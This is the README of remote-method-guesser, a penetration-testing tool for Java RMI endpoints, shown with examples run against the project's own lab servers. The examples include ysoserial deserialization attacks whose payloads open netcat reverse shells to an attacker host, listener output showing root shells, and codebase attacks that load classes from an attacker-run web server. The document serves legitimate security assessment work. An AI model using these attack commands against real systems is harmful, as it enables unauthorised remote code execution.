### Remote Method Guesser

---

*remote-method-guesser* (*rmg*) is a command line utility written in *Java* and can be used to identify security
vulnerabilities on *Java RMI* endpoints. Currently, the following operations are supported:

* List available *bound names* and their corresponding interface class names
* List codebase locations (if exposed by the remote server)
* Check for known vulnerabilities (enabled class loader, missing *JEP290*, localhost bypass)
* Identify existing remote methods by using a *bruteforce* (wordlist) approach
* Call remote methods with *ysoserial gadgets* within the arguments
* Call remote methods with a client specified codebase (remote class loading attack)
* Perform *DGC* and *registry* calls with *ysoserial* gadgets or a client specified codebase
* Perform *bind*, *unbind* and *rebind* operations against a registry
* Extend ysoserial gadgets with [An Trinhs registry bypass](https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/)
* Enumerate the unmarshalling behavior of ``java.lang.String``
* Create Java code dynamically to invoke remote methods manually

During remote method guessing, deserialization and codebase attacks, the argument types of remote method calls
are confused to prevent method invocation on the server side. This technique is not unique to *remote-method-guesser*
and was used first (to the best of my knowledge) by [Jake Miller](https://twitter.com/theBumbleSec) in the
[rmiscout](https://github.com/BishopFox/rmiscout) project.

![](https://github.com/qtc-de/remote-method-guesser/workflows/master%20maven%20CI/badge.svg?branch=master)
![](https://github.com/qtc-de/remote-method-guesser/workflows/develop%20maven%20CI/badge.svg?branch=develop)
![](https://github.com/qtc-de/remote-method-guesser/workflows/example%20server%20-%20master/badge.svg?branch=master)
![](https://github.com/qtc-de/remote-method-guesser/workflows/example%20server%20-%20develop/badge.svg?branch=develop)
![Remote Method Guesser Example](https://tneitzel.eu/73201a92878c0aba7c3419b7403ab604/rmg-example.gif)


### Installation

------

*rmg* is a *maven* project and installation should be straight forward. With [maven](https://maven.apache.org/) 
installed, just execute the following commands to create an executable ``.jar`` file:

```console
$ git clone https://github.com/qtc-de/remote-method-guesser
$ cd remote-method-guesser
$ mvn package
```

*rmg* also supports autocompletion for *bash*. To take advantage of autocompletion, you need to have the
[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
copying the [completion script](./resources/bash_completion.d/rmg) to your ``~/.bash_completion.d`` folder enables
autocompletion.

```console
$ cp resources/bash_completion.d/rmg ~/bash_completion.d/
```


### Supported Operations

-----

In the following, short examples for each available operation are presented. For a more detailed description
you should read the [documentation folder](./docs). All presented examples are based on the [rmg-example-server](https://github.com/qtc-de/remote-method-guesser/packages/414459)
which is also contained within this project. You can also modify and rebuild the example server yourself, by using
the sources within the [docker folder](./.docker).

```console
[qtc@kali ~]$ rmg --help
usage: rmg [options] <ip> <port> <action>

rmg v3.1.0 - Identify common misconfigurations on Java RMI endpoints.

Positional Arguments:
    ip                              IP address of the target
    port                            Port of the RMI registry
    action                          One of the possible actions listed below

Possible Actions:
    act <gadget> <command>          Performs Activator based deserialization attacks
    bind <boundname> <listener>     Binds an object to the registry thats points to listener
    codebase <classname> <url>      Perform remote class loading attacks
    dgc <gadget> <command>          Perform DGC based deserialization attacks
    enum                            Enumerate bound names, classes, SecurityManger and JEP290
    guess                           Guess methods on bound names
    listen <gadget> <command>       Open ysoserials JRMP listener
    method <gadget> <command>       Perform method based deserialization attacks
    rebind <boundname> <listener>   Rebinds boundname as object that points to listener
    reg <gadget> <command>          Perform registry based deserialization attacks
    unbind <boundName>              Removes the specified bound name from the registry

Optional Arguments:
    --argument-position <int>       select argument position for deserialization attacks
    --bound-name <name>             guess only on the specified bound name
    --config <file>                 path to a configuration file
    --create-samples                create sample classes for identified methods
    --dgc-method <method>           method to use during dgc operations (clean|dirty)
    --follow                        follow redirects to different servers
    --force-legacy                  treat all classes as legacy stubs
    --help                          display help message
    --localhost-bypass              attempt localhost bypass for registry operations (CVE-2019-2684)
    --no-color                      disable colored output
    --no-legacy                     disable automatic legacy stub detection
    --reg-method <method>           method to use during registry operations (bind|lookup|unbind|rebind)
    --sample-folder <folder>        folder used for sample generation
    --signature <method>            function signature or one of (dgc|reg|act)
    --ssl                           use SSL for the rmi-registry connection
    --stack-trace                   display stack traces for caught exceptions
    --template-folder <folder>      location of the template folder
    --threads <int>                 maximum number of threads (default: 5)
    --trusted                       disable bound name filtering
    --update                        update wordlist file with method hashes
    --wordlist-file <file>          wordlist file to use for method guessing
    --wordlist-folder <folder>      location of the wordlist folder
    --yso <file>                    location of ysoserial.jar for deserialization attacks
    --zero-arg                      allow guessing on void functions (dangerous)
```


#### Enumeration (enum)

The ``enum`` action performs several checks on the specified *RMI registry* endpoint. It provides a list of all
available bound names, displays the servers codebase (if existent), checks for missing *JEP290* and [some other
common vulnerabilities](./docs/actions#enum). ``enum`` is the default action of *remote-method-guesser* and can either be invoked by
only specifying the port and IP address of a target or by specifying ``enum`` as action explicitly.

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090
[+] RMI registry bound names:
[+] 
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- ssl-server
[+] 		--> de.qtc.rmg.server.interfaces.ISslServer (unknown class)
[+] 	- secure-server
[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer (unknown class)
[+] 
[+] RMI server codebase enumeration:
[+] 
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.interfaces.ISslServer
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+] 		--> javax.rmi.ssl.SslRMIClientSocketFactory
[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer
[+] 
[+] RMI server String unmarshalling enumeration:
[+] 
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
[+] 
[+] RMI server useCodebaseOnly enumeration:
[+] 
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
[+] 
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+] 
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
[+] 
[+] RMI DGC enumeration:
[+] 
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The DGC uses most likely a separate security policy.
[+] 	  Configuration Status: Current Default
[+] 
[+] RMI server JEP290 enumeration:
[+] 
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+] 
[+] RMI registry JEP290 bypass enmeration:
[+] 
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
[+] 
[+] RMI ActivationSystem enumeration:
[+] 
[+] 	- Caught NoSuchObjectException during activate call (activator not present).
[+] 	  Configuration Status: Current Default
```

#### Bind Operations (bind|rebind|unbind)

By using the ``bind``, ``rebind`` or ``unbind`` action, it is possible to modify the available *bound names* within the *RMI registry*.
This is especially useful for verifying ``CVE-2019-2684``, which bypasses the localhost restrictions and enables remote users to perform
bind operations. Whereas the ``unbind`` action only requires the *bound name* that should be removed, the ``bind`` and ``rebind`` operations
also require a *RemoteObject* that should be bound. *remote-method-guesser* always uses ``javax.management.remote.rmi.RMIServerImpl_Stub``
for this purpose, which is the *RemoteObject* used by *jmx*. You need also to specify the address of the corresponding *TCP endpoint*
(address where clients should connect to, when they attempt to use your bound object).

```console
[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090
[+] Creating RMI Registry object... done.
[+] Obtaining list of bound names... done.
[+] 3 names are bound to the registry.
[+]
[+] Listing bound names in registry:
[+]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- ssl-server
[+] 		--> de.qtc.rmg.server.interfaces.ISslServer (unknown class)
[+] 	- secure-server
[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer (unknown class)
[...]

[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 bind jmxrmi 172.23.0.1:4444 --localhost-bypass
[+] Binding name jmxrmi to TCPEndpoint 172.23.0.1:4444
[+] 
[+] 	Encountered no Exception during bind call.
[+] 	Bind operation was probably successful.

[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 
[+] Creating RMI Registry object... done.
[+] Obtaining list of bound names... done.
[+] 4 names are bound to the registry.
[+] RMI object tries to connect to different remote host: 172.23.0.1
[+] 	Redirecting the connection back to 172.23.0.2... 
[+] 	This is done for all further requests. This message is not shown again. 
[+] 
[+] Listing bound names in registry:
[+] 
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- ssl-server
[+] 		--> de.qtc.rmg.server.interfaces.ISslServer (unknown class)
[+] 	- secure-server
[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer (unknown class)
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
[...]
```

#### Method Guessing (guess)

When using the ``guess`` action, *remote-method-guesser* attempts to identify existing remote methods by sending method hashes
to the remote server. This operation requires a wordlist that contains the corresponding method definitions.
*remote-method-guesser* ships some default wordlists and expects them in the path ``/opt/remote-method-guesser/wordlists/``.
You can change this path either by modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
or ``--wordlist-folder`` options. Methods with zero arguments are skipped during the enumeration, as they lead to real method calls
on the server side. You can enable guessing on them by using the ``--zero-arg`` switch. 

```console
[qtc@kali ~]$ rmg --ssl --zero-arg 172.23.0.2 1090 guess
[+] Creating RMI Registry object... done.
[+] Obtaining list of bound names... done.
[+] 3 names are bound to the registry.
[+] 2 wordlist files found.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+] 
[+] Starting RMG Attack
[+] 	No target name specified. Guessing on all available bound names.
[+] 	Guessing 3294 method signature(s).
[+] 	
[+] 	Current bound name: ssl-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature String system(String[] dummy) exists!
[+] 			HIT! Method with signature int execute(String dummy) exists!
[+] 			HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		
[+] 	Current bound name: plain-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 			HIT! Method with signature String execute(String dummy) exists!
[+] 		
[+] 	Current bound name: secure-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
[+] 			HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
[+] 			HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		
[+] 
[+] Listing successfully guessed methods:
[+] 	-  ssl-server
[+] 		--> String system(String[] dummy)
[+] 		--> int execute(String dummy)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 	-  plain-server
[+] 		--> String system(String dummy, String[] dummy2)
[+] 		--> String execute(String dummy)
[+] 	-  secure-server
[+] 		--> void updatePreferences(java.util.ArrayList dummy1)
[+] 		--> void logMessage(int dummy1, Object dummy2)
[+] 		--> String login(java.util.HashMap dummy1)
```

#### Method Based Deserialization Attacks (method)

Remote methods that do not only use primitive types within their arguments are often vulnerable to *deserialization attacks*.
This [blog post](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) by [Hans-Martin Münch](https://twitter.com/h0ng10)
explains this issue in more detail. *remote-method-guesser* can be used to easily verify such vulnerabilities. As an example,
we can use the ``String login(java.util.HashMap dummy1)`` method that was guessed in the example above.

```console
[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 method CommonsCollections6 "nc 172.23.0.1 4444 -e ash" --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
[+] Creating RMI Registry object... done.
[+] Creating ysoserial payload... done.
[+] Attacking signature String login(java.util.HashMap dummy1) (ysoserial attack)
[+] Target name specified. Only attacking bound name: secure-server
[+] 
[+] Current bound name: secure-server
[+] 	Found non primitive argument type on position 0
[+] 	RMI object tries to connect to different remote host: iinsecure.dev
[+] 		Redirecting the connection back to 172.23.0.2... 
[+] 		This is done for all further requests. This message is not shown again. 
[+] 	Invoking remote method...
[+] 		Caught ClassNotFoundException during ysoserial attack.
[+] 		Deserialization attack most likely worked :)
```

On another terminal, you can confirm that the *deserialization attack* was indeed successful:

```console
[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.23.0.2.
Ncat: Connection from 172.23.0.2:39041.
id
uid=0(root) gid=0(root) groups=0(root)
```

#### General Deserialization Attacks (act|reg|dgc)

Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote methods* that are needed for the internal *RMI communication*.
Whereas modern *RMI servers* apply *deserialization filters* on these *well known remote methods* (*JEP290*), older servers may be vulnerable against *deserialization
attacks* too. *remote-method-guesser* allows to test this by using the ``act``, ``dgc`` and ``reg`` actions, that perform deserialization attacks on the *Activator*, *Distributed
Garbage Collector* (*DGC*) or the *RMI registry* directly. For testing purposes you can use the sufficiently outdated [example server](https://github.com/qtc-de/beanshooter/packages/398561)
from the the [beanshooter repository](https://github.com/qtc-de/beanshooter):

```console
[qtc@kali ~]$ rmg --ssl 172.23.0.2 9010 dgc CommonsCollections6 "nc 172.23.0.1 4444 -e /bin/bash"
[+] Creating ysoserial payload... done.
[+] Attempting ysoserial attack on DGC endpoint...
[+] 
[+] 	Caught ClassCastException during deserialization attack.
[+] 	Deserialization attack was probably successful :)

[...]

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.23.0.2.
Ncat: Connection from 172.23.0.2:38710.
id
uid=0(root) gid=0(root) groups=0(root)
```

In case of the *RMI registry*, the *deserialization filters* may be bypassed by using the [JRMPClient](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java)
or the [An Trinh](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) bypass gadgets. These gadgets create an *outbound RMI channel*
that does no longer apply *deserialization filters*. On this channel, deserialization attacks can be applied as usual, but both bypasses were patched
in the most recent versions of *Java RMI*.

```console
[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 reg AnTrinh 172.23.0.1:4444 
[+] 
[+] Attempting deserialization attack on RMI registry endpoint...
[+] 
[+] 	Caught javax.management.BadAttributeValueExpException during deserialization attack.
[-] 	This could be caused by your gadget an the attack probably worked anyway.
[-] 	If it did not work, you can retry with --stack-trace to see the details.

[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "nc 172.23.0.1 4445 -e ash"
[+] Creating a JRMPListener on port 4444.
[+] Handing off to ysoserial...
* Opening JRMP listener on 4444
Have connection from /172.23.0.2:38784
Reading message...
Sending return with payload for obj [0:0:0, 123]

[qtc@kali ~]$ nc -vlp 4445
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 172.23.0.2.
Ncat: Connection from 172.23.0.2:40799.
id
uid=0(root) gid=0(root) groups=0(root)
```

During it's ``enum`` action, *remote-method-guesser* informs you whether an *Activator* is present on the *RMI endpoint* (legacy *RMI mechanism*).
The default implementation for the *Activation system* does not implement any deserialization filters for the *Activator RemoteObject*. Therefore,
deserialization attacks on an *Activator* endpoint should always work. For testing purposes, you can use ``rmid`` with a corresponding gadget
chain within the class path:

```console
[qtc@kali ~]$ sudo cp /opt/commons-collections-3.1.jar /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext
[qtc@kali ~]$ rmid

[qtc@kali ~]$ rmg 127.0.0.1 1098 act CommonsCollections6 "nc 127.0.0.1 4444 -e /bin/bash"
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on Activation endpoint...
[+]
[+] 	Caught IllegalArgumentException during deserialization attack.
[+] 	Deserialization attack was probably successful :)

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:34210.
id
uid=1004(qtc) gid=1004(qtc) groups=1004(qtc)
```


#### Codebase Attacks (codebase)

*Java RMI* supports a feature called *codebases*, where the client and the server can specify *URLs* during *RMI calls* that
may be used to load unknown classes dynamically. If an *RMI server* accepts *client specified codebases*, this can lead to
*remote code execution* by providing malicious *Java* classes during the *RMI communication*.

The codebase configuration on an *RMI server* can be different for the different components: *Activator*, *DGC*, *Registry* and *Application Level*.
*remote-method-guesser* allows you to test each component individually by using either ``--signature <method>`` (application level),
``--signature act`` (activator), ``--signature dgc`` (distributed garbage collector) or ``--signature reg`` (rmi registry) together with the
``codebase`` action.

**Application Level**

```console
[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example http://172.23.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
[+] Creating RMI Registry object... done.
[+] Attacking signature String login(java.util.HashMap dummy1) (codebase attack)
[+] Target name specified. Only attacking bound name: secure-server
[+] 
[+] Current bound name: secure-server
[+] 	Found non primitive argument type on position 0
[+] 	RMI object tries to connect to different remote host: iinsecure.dev
[+] 		Redirecting the connection back to 172.23.0.2... 
[+] 		This is done for all further requests. This message is not shown again. 
[+] 	Invoking remote method...

[qtc@kali ~]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.23.0.2 - - [13/Jan/2021 07:17:10] "GET /Example.class HTTP/1.1" 200 -
```

**RMI Registry**

```console
[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example 172.23.0.1:8000 --signature reg
[+] Attempting codebase attack on RMI registry endpoint...
[+] Using class Example with codebase http://172.23.0.1:8000/ during lookup call.

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.23.0.2 - - [13/Jan/2021 07:45:48] "GET /Example.class HTTP/1.1" 200 -
```

**Distributed Garbage Collector**

```console
[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example 172.23.0.1:8000 --signature dgc
[+] Attempting codebase attack on DGC endpoint...
[+] Using class Example with codebase http://172.23.0.1:8000/ during clean call.

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.23.0.2 - - [13/Jan/2021 07:48:31] "GET /Example.class HTTP/1.1" 200 -
```

**Activator**

```console
[qtc@kali ~]$ rmg 127.0.0.1 1098 codebase Example 127.0.0.1:8000 --signature act
[+] Attempting codebase attack on Activator endpoint...
[+] Using class Example with codebase http://127.0.0.1:8000/ during activate call.

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [29/Jan/2021 06:59:43] "GET /Example.class HTTP/1.1" 200 -
```


#### JRMPListener (listen)

As already demonstrated above, it is sometimes required to provide a malicious *JRMPListener*, which serves deserialization payloads
to incomming *RMI* connections. Writing such a listener from scratch is not necessary, as it is already provided by the
[ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java).
However, *remote-method-guesser* provides a wrapper around the *ysoserial* implementation, which lets you spawn a *JRMPListener*
by using the usual *rmg* syntax:

```console
[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "touch /dev/shm/test"
[+] Creating a JRMPListener on port 4444.
[+] Handing off to ysoserial...
* Opening JRMP listener on 4444
```


#### Sample Generation (--create-samples)

Despite being none of the available actions, *sample generation* is another useful feature of *remote-method-guesser* and can be enabled
during the ``guess`` action. In some situations, *RMI* endpoints expose methods that sound interesting on their own, without thinking
about *deserialization* or *codebase attacks*. Consider the example above, where the ``plain-server`` bound name exposes such promising
methods:

```console
[+] Listing successfully guessed methods:
[+] 	-  plain-server
[+] 		--> String system(String dummy, String[] dummy2)
[+] 		--> String execute(String dummy)
```

Depending on the situation, it might be desired to invoke these methods using legitimate *RMI calls*, but writing the corresponding *Java code*
manually is a tedious work. By using the ``--create-samples`` parameter, you can create sample code for successfully
guessed *remote methods* automatically. By using the ``--signature`` and ``--bound-name`` options, it is also possible to generate code only
for one already known method. The following command generates the required *Java code* to invoke the ``execute`` method on the ``plain-server``
bound name:

```console
[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 guess --create-samples --signature "String execute(String dummy)" --bound-name plain-server
[+] Creating RMI Registry object... done.
[+] 
[+] Starting Method Guessing:
[+] 	Target name specified. Only guessing on bound name: plain-server.
[+] 	Guessing 1 method signature(s).
[+] 	Method signature: String execute(String dummy).
[+] 	
[+] 	Current bound name: plain-server.
[+] 		RMI object tries to connect to different remote host: iinsecure.dev.
[+] 			Redirecting the connection back to 172.23.0.2... 
[+] 			This is done for all further requests. This message is not shown again. 
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature String execute(String dummy) exists!
[+] 		
[+] 
[+] Listing successfully guessed methods:
[+] 	-  plain-server
[+] 		--> String execute(String dummy)
[+] 
[+] Starting creation of sample files:
[+] 
[+] 	Creating samples for bound name plain-server.
[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/IPlainServer.java
[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/execute/execute.java
```

For a successful *RMI call* you always need an interface definition and the code for the actual method code
itself. The interface file created by *remote-method-guesser* (``IPlainServer.java``) can be compiled right
away, whereas the actual method call (``execute.java``) contains a ``TODO`` for each method argument.

```java
[qtc@kali ~]$ grep -A 5 "TODO" /home/qtc/rmg-samples/plain-server/execute/execute.java
            java.lang.String argument0 = TODO;

            System.out.print("[+] Invoking method execute... ");
            java.lang.String response = stub.execute(argument0);
            System.out.println("done!");
```

For this demonstration, ``TODO`` is replaced by the String ``id``, as the method name ``execute`` could mean that the argument is used for
command execution. After making this substitution and compiling the two generated files, the *remote method* can be invoked:

```console
[qtc@kali ~]$ cd /home/qtc/rmg-samples/plain-server/
[qtc@kali plain-server]$ javac IPlainServer.java -d .
[qtc@kali plain-server]$ sed -i -e 's/TODO/"id"/' execute/execute.java 
[qtc@kali plain-server]$ javac execute/execute.java -d .
[qtc@kali plain-server]$ java execute
[+] Connecting to registry on 172.18.0.2:1090... done!
[+] Starting lookup on plain-server... 
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+]	Redirecting the connection back to 172.18.0.2... 
[+]	This is done for all further requests. This message is not shown again. 
[+] Invoking method execute... done!
[+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
```


### Wordlists Files

-----

*remote-method-guesser* guesses *remote methods* based on a wordlist approach. Corresponding wordlists are shipped within this repository and are contained
within the [wordlist directory](./wordlists). Wordlists are stored using an optimized *rmg-internal* format:

```
<RETURN_VALUE> <METHODNAME>(<ARGUMENTS>); <METHOD_HASH>; <IS_PRIMITIVE>; <IS_VOID>;
```

The first three placeholders should be self explanatory and match the format of a common *Java method signature*. The last three placeholders
describe the following properties of a function:

1. ``<METHOD_HASH>``: The method hash that is used by *RMI* internally to identify the remote method.
2. ``<IS_PRIMITIVE>``: Describes whether the first function parameter is a primitive type or not.
3. ``<IS_VOID>``: Describes whether the function takes parameters or not (yes, the name is a little bit misleading).

All this information is used to speed up *RMI calls* and to reduce the amount of *dynamic class generation*. The resulting wordlist files
look like this:

```console
[qtc@kali wordlists]$ head -n 5 rmg.txt 
boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
boolean call(String dummy, String dummy2); -9048491806834107285; false; false
boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
boolean call(String dummy); -5603201874062960450; false; false
boolean call(String[] dummy); -4301784332653484516; false; false
```

However, *remote-method-guesser* is also able to process non-optimized wordlists that contain plain function signatures:

```console
[qtc@kali wordlists]$ cat custom_wordlist.txt
boolean example_signature(String test)
[qtc@kali wordlists]$ rmg --ssl 172.18.0.2 1090 guess
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 3 names are bound to the registry.
[+] 3 wordlist files found.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/custom_wordlist.txt
[+] 	1 methods were successfully parsed.
[...]
```

Furthermore, by using the ``--update`` switch during the ``guess`` action, *remote-method-guesser* updates your wordlist to the optimized format:

```console
[qtc@kali wordlists]$ cat custom_wordlist.txt
boolean example_signature(String test); -8079561808652318592; false; false
```

By default, *remote-method-guesser* expects wordlists to be located at ``/opt/remote-method-guesser/wordlists``. If this configuration does not fit for you,
you can change the default location within the configuration file. For dynamic changes you can also use the ``--wordlist-file`` and
``--wordlist-folder`` options.


### Template Files

----

Template files are used by *remote-method-guesser* for sample generation. They are located in the [templates folder](./templates) and
contain all the *Java code* required for sample generation (apart from some placeholders). During the sample generation process,
*rmg* simply replaces the placeholders with appropriate values for the current *remote method*.

It is generally not recommended to modify the template files, but it is of cause possible if you know what you are doing. However,
keep in mind that template files should stay generic and that the different placeholders are usually required to guarantee this.

As automatically generated sample files contain content that is controlled by the remote server (*bound names*, *class names* and *package names*),
it is generally a security risk to compile and execute them. *remote-method-guesser* tries to reduce the risk by applying input filtering to
the above mentioned components. In some situations, this can be annoying. Especially *bound names* can contain a wide range of different characters
and most of them are rejected by *rmg* (this is because a whitelist filtering is used, instead of a blacklist). After you reviewed the *bound names*
and corresponding *remote classes* by using *rmg's* ``enum`` action, you may use the ``--trusted`` switch to disable input filtering during
sample generation. However, this should only be done after verifying that the remote server does not expose any malicious contents within its
*bound names* or *remote class names*.


### Configuration

-----

*remote-method-guesser* provides some command line switches to modify its behavior dynamically, but persistent configuration changes
are also quite easy to implement. *rmg* uses a [configuration file](./src/config.properties) to obtain default values for certain options,
but it also accepts a different configuration file passed using the ``--config`` option. The current default configuration looks like this:

```properties
template-folder  = /opt/remote-method-guesser/templates/
wordlist-folder  = /opt/remote-method-guesser/wordlists/
sample-folder    = ./rmg-samples
wordlist-file    =
ysoserial-path   = /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar
threads = 5
```

For persistent configuration changes, just apply them to the ``./src/config.properties`` file and rebuild *rmg* as explained above.
You can also create a ``.properties`` file with your own configuration and feed it into *rmg* using the ``--config`` option.


### Acknowledgements

----

Version ``v3.0.0`` of *remote-method-guesser* was heavily influenced by the great blog posts of [Hans-Martin Münch](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
and [Jake Miller](https://labs.bishopfox.com/tech-blog/rmiscout). *rmg* may appears to be a clone of [rmiscout](https://github.com/BishopFox/rmiscout) and indeed,
the provided functionalities are quite similar now. However, notice that *remote-method-guesser* was public since 2019 and before *rmiscout* was released in 2020.
In his implementation, *Jake* did a lot of things better than me and I had to decide whether to throw away my previous work or to adopt some features. I chose the second
approach, but implemented the different features slightly different than *rmiscout*. Still, huge credits to *Jake* for his idea of bruteforcing *remote methods* without really
invoking them. Now the community has two powerful tools to engage *RMI servers* during *blackbox* security assessments.

Furthermore, the [rmiscout wordlist](./wordlists/rmiscout.txt) was obviously copied from the *rmiscout* project (as you can already tell by the different license agreement).
Thanks *Jake*, for this awesome wordlist of *remote methods* collected from different *GitHub* repositories.

*Copyright 2021, Tobias Neitzel and the remote-method-guesser contributors.*
